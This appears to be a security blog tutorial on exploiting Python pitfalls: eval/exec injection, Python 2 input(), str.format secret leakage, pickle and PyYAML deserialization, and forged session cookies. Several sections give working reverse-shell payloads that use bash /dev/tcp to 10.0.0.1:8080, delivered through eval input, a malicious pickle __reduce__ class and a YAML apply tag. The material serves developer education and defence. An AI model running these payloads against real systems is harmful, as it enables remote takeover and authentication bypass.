---
title: "Hacking Python Applications"
categories:
  - Hacking
---

And how attackers exploit common programming pitfalls to gain control.

How secure an application is has very little to do with language choice. You can program securely in languages that are prone to vulnerabilities, and do very insecure things with languages designed to be secure.

However, there are features that developers should be on the lookout for as potential weaknesses in every language. Today, let's talk about a few dangerous features that could be exploited by attackers in Python.

## Exploiting dangerous functions: eval(), exec() and input()

Dangerous functions in Python like eval(), exec() and input() can be used to achieve authentication bypass and even code injection.

### Eval()

The eval() function in Python takes strings and execute them as code. For example, eval('1+1') would return 2.

Since eval() can be used to execute arbitrary code on the system, it should never ever ever be used on any type of unsanitized user input. Let's look at a vulnerable application for example. The following calculator application uses a JSON API to accept user input:

```python
def addition(a, b):
  return eval("%s + %s" % (a, b))result = addition(request.json['a'], request.json['b'])
print("The result is %d." % result)
```

When operating as expected, the input

```python
{"a":"1", "b":"2"}
```

Would cause the program to print "The result is 3."

But since eval() would take user-provided input and execute it as Python code, a hacker could provide the application with something more malicious instead:

```python
{"a":"__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#", "b":"2"}
```

This input would cause the application to call os.system() and spawn a reverse shell back to the IP 10.0.0.1 on port 8080.

### Exec()

exec() is similar to eval() as they both have the ability to execute Python code from a given string input. The following program could be exploited in the same way as above:

```python
def addition(a, b):
  return exec("%s + %s" % (a, b))addition(request.json['a'], request.json['b'])
  ```

### Input()

In Python 2, there are two built-in functions for taking user input: input() and raw_input(). Whereas in Python 3, there is only one: input().

The difference between input() and raw_input() in Python 2 is that raw_input() will take the user input and convert it into a string before further processing. Whereas input() will retain the original data type of the supplied value.

So what's the issue with this? Using Python 2's input() function could mean that attackers are free to pass in variable names, function names and other data types, leading to authentication bypass and other unexpected outcomes.

For example, if a program is using the following code for access control:

```python
user_pass = get_user_pass("admin")
if user_pass == input("Please enter your password"):
  login()
else:
  print "Password is incorrect!"
  ```

The attacker could simply pass in the user_pass variable name as input and the test case would pass since the program would interpret the user input as a variable. The Python conditional would then become:

```python
if user_pass == user_pass: // this will evaluate as true
```

The attacker could even pass in get_user_pass("admin") and get the same result as the user input would be interpreted as a function call.

```python
if user_pass == get_user_pass("admin"):
// this will also evaluate as true
```

Because of these security concerns, if using Python 2, raw_input() should be used instead of input().

This vulnerability is eliminated in Python 3. The only input function in Python 3, input(), behaves in the same way as raw_input() in Python 2, and will always convert user input to a string.

## Exploiting string formatting

Another dangerous Python function is str.format(). If an application uses str.format() on a user-controlled format string, an attacker might be able to access arbitrary data of the program via crafted format strings. This is an easy-to-exploit and severe vulnerability that leads to authentication bypass and leaks of confidential data.

Python 3 introduced a new way of formatting text that is much more powerful and flexible than the old format strings using % operators. One of the features of the new string formatting functionality is that you could access the attributes of objects. This means that you could do something like this:

Imagine there is a program like the following that allows users to format their own nametag using str.format().

```python
CONFIG = {
  "API_KEY": "771df488714111d39138eb60df756e6b"
  // some program secrets that users should not be able to read
}

class Person(object):
  def __init__(self, name):
    self.name = name
  def print_nametag(format_string, person):
    return format_string.format(person=person)
 
new_person = Person("Vickie")
print_nametag(input("Please format your nametag!"), person)
```

You could do something like this with the format string:

```python
print_nametag("Hi, my name is {person.name}. I am a {person.__class__.__name__}.", new_person)
```

This would output:

```python
"Hi, my name is Vickie. I am a Person."
```

The issue arises when users control the format string directly, and when a Python object is passed into the format string. This is due to the use of [special attributes](https://docs.python.org/3.3/reference/datamodel.html) of Python object methods. These attributes can be used to leak a variety of program data. For example, the attribute __globals__ can be used to access the dictionary that stores global variables.

```python
print_nametag("{person.__init__.__globals__[CONFIG][API_KEY]}", new_person)
```

Would return "771df488714111d39138eb60df756e6b", thus leaking the API key that the application uses.

## Exploiting Pickle deserialization

Serialization is a process during which an object in a programming language (say, a Python object) is converted into a format that can be saved to the database or transferred over a network. Whereas deserialization refers to the opposite: it's when the serialized object is read from a file or the network and converted back into an object.

In Python, serialization is done through Pickles. The following code will print the pickled representation of new_person (this process is called pickling):

```python
class Person:
  def __init__(self, name):
    self.name = name

new_person = Person("Vickie")
print(pickle.dumps(new_person))
```

Would print:

```python
b'\x80\x03c__main__\nPerson\nq\x00)\x81q\x01}q\x02X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00Vickieq\x04sb.'
```

Whereas pickle.loads(pickled_object) will return the original Python object for the application to operate on. (This process is called unpickling.)

```python
print(pickle.loads(b'\x80\x03c__main__\nPerson\nq\x00)\x81q\x01}q\x02X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00Vickieq\x04sb.').name)
// -> prints "Vickie"
```

The danger in this functionality occurs when an application unpickles data from untrusted sources. If an attacker can control data that is unpickled by the application, she can cause authentication bypass and often even code execution.

### Authentication bypass

If an application uses information from a pickled object for access control and does not check the integrity of the object, an attacker can simply supply the application with a forged pickle to bypass access control.

Let's say an application's session cookie is a string that is the base64 encoded, pickled representation of a Person object. And when the application receives a session cookie, it unpickles it to check for the user's identity in the "name" field of the object.

```python
class Person:
  def __init__(self, name):
    self.name = name

new_person = Person("Vickie")
session_cookie = base64_encode(pickle.dumps(new_person))
```

Pickling data does not provide any form of data protection. It is simply a way of packaging data for transmission. If the cookie is not encrypted and the integrity of the cookie is not checked before use, an attacker can easily forge a cookie for any user using the following code:

```python
class Person:
  def __init__(self, name):
    self.name = name

new_person = Person("Admin")
session_cookie = base64.b64encode(pickle.dumps(new_person))
```

### Code Execution

Now for the even more exciting part: achieving code execution by utilizing insecure pickle deserialization!

Remember, a pickle can represent any arbitrary Python object. When an application unpickles a pickle, it is instantiating a new object of that class.

The pickle class allows objects to declare how they should be pickled via the __reduce__ method. This method takes no argument and returns either a string or a tuple. When returning a tuple, the tuple will dictate how the object is reconstructed during unpickling. The tuple should be in the form of:

```python
(callable object that will be called to instantiate the new object, a tuple of arguments for that callable object)
```

This means that if an attacker defines a __reduce__ method in an object, the pickled object could be instantiated as something else during unpickling. Now if the attacker constructs a malicious object like this:

```python
class Malicious:
  def __reduce__(self):
    return (os.system, ('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',))

fake_object = Malicious()
session_cookie = base64.b64encode(pickle.dumps(fake_object))
```

She can make the victim application call the following upon unpickling:

```python
os.system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
```

This would spawn a reverse shell to the IP 10.0.0.1 on port 8080.

## Exploiting YAML parsing

Another way that insecure deserialization can endanger Python applications is through the loading of YAML files.

YAML, interesting enough, stands for "YAML Ain't Markup Language". It is a data serialization standard that is widely used across programming languages. In Python, PyYaml is the most popular YAML processor.

YAML files, similar to pickles, can represent arbitrary Python objects. In PyYaml, you can package a Python object into a YAML document like so:

```python
class Person:
  def __init__(self, name):
    self.name = name

new_person = Person("Vickie")
print(yaml.dump(new_person))
```

This will print a string like this:

```python
!!python/object:__main__.Person {name: Vickie}
```

To reconstruct the YAML file to the original Python object, applications call:

```python
yaml.load(YAML_FILE)
```

Similar to pickle deserialization issues, YAML loading gives attackers a way to forge arbitrary objects and achieve code execution.

### Authentication bypass

If the application uses user-supplied YAML for access control and does not check for integrity of the YAML file, a malicious user can potentially forge arbitrary YAML documents to bypass access control.

```python
class Person:
  def __init__(self, name):
    self.name = name

new_person = Person("Vickie")
session_cookie = base64_encode(yaml.dump(new_person))
```

For example, if the above code is used to generate the session cookie for a user, an attacker can simply generate a forged session cookie:

```python
class Person:
  def __init__(self, name):
    self.name = name

new_person = Person("Admin")
session_cookie = base64_encode(yaml.dump(new_person))
```

### Code Execution

If the application uses PyYaml < 4.1, it is also possible to achieve arbitrary code execution by providing the application with an os.system() command inside a YAML:

```python
!!python/object/apply:os.system ["bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]
```

## Other dangerous when developing in Python

Besides language-specific vulnerabilities, platform-agnostic issues like XSS, XXE, SQL injection and command injections are always something to be on the lookout for.

In addition, polluted packages and unpatched dependencies continue to be one of the biggest security concerns for Python developers. So be sure to pay attention to those as well!